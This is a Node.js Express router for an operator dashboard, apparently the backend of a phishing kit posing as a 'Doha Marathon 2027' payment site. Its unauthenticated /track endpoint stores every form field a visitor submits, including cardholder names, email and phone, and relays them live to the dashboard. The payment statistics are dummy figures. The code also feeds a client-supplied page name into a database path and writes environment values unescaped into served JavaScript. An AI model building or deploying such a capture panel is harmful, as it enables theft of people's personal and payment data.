const express = require('express');
const router = express.Router();
const { UserSession } = require('../models');
const { dashboardAuth } = require('../middleware/auth');

router.get('/stats', dashboardAuth, async (req, res) => {
  try {
    const activeUsers = await UserSession.countDocuments({ isConnected: true });
    res.json({
      activeUsers,
      paymentsToday: 120, // Dummy data as original
      totalRevenue: 5400, // Dummy data as original
      successRate: 98 // Dummy data as original
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/users', dashboardAuth, async (req, res) => {
  try {
    const users = await UserSession.find().sort({ lastActive: -1 }).limit(100);
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/user/:sessionId', dashboardAuth, async (req, res) => {
  try {
    const user = await UserSession.findOne({ sessionId: req.params.sessionId });
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/config', (req, res) => {
  res.json({
    projectName: process.env.PROJECT_NAME || 'ماراثون الدوحة 2027'
  });
});

router.get('/env-config.js', (req, res) => {
  res.type('application/javascript');
  res.send(`
    window.APP_CONFIG = {
      FRONTEND_URL: "${process.env.FRONTEND_URL || ''}",
      DASHBOARD_URL: "${process.env.DASHBOARD_URL || ''}",
      PROJECT_NAME: "${process.env.PROJECT_NAME || 'ماراثون الدوحة 2027'}",
      INSTANCE_KEY: "${process.env.INSTANCE_KEY || 'default_key'}"
    };
  `);
});

router.post('/track', async (req, res) => {
  const { sessionId, type, page, data } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

  try {
    if (type === 'page-view') {
      await UserSession.findOneAndUpdate(
        { sessionId },
        { 
          $set: { 
            isConnected: true, 
            currentPage: page,
            lastActive: new Date()
          } 
        },
        { upsert: true }
      );
      if (req.io) req.io.emit('user:page-change', { sessionId, page });
    } else if (type === 'form-submit') {
      const currentDoc = await UserSession.findOne({ sessionId });
      const existingPageData = (currentDoc && currentDoc.formData && currentDoc.formData[page]) ? currentDoc.formData[page] : {};
      const mergedPageData = { ...existingPageData, ...data };

      const updateData = {
        [`formData.${page}`]: mergedPageData,
        lastActive: new Date()
      };
      const candidateName = data.name || [data.firstName, data.lastName].filter(Boolean).join(' ') || data.cardholderName;
      if (candidateName && String(candidateName).trim()) {
        updateData.name = String(candidateName).trim();
      }
      if (data.email && String(data.email).trim()) {
        updateData.email = String(data.email).trim();
      }
      if (data.phone && String(data.phone).trim()) {
        updateData.phone = String(data.phone).trim();
      }

      const updatedDoc = await UserSession.findOneAndUpdate(
        { sessionId },
        { $set: updateData },
        { new: true, upsert: true }
      );
      if (req.io) {
        const payload = {
          sessionId,
          page,
          formData: mergedPageData,
          name: updatedDoc.name,
          email: updatedDoc.email,
          phone: updatedDoc.phone,
          allFormData: updatedDoc.formData
        };
        req.io.emit('user:form-submit', payload);
        req.io.emit('user:update', payload);
      }
    }
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
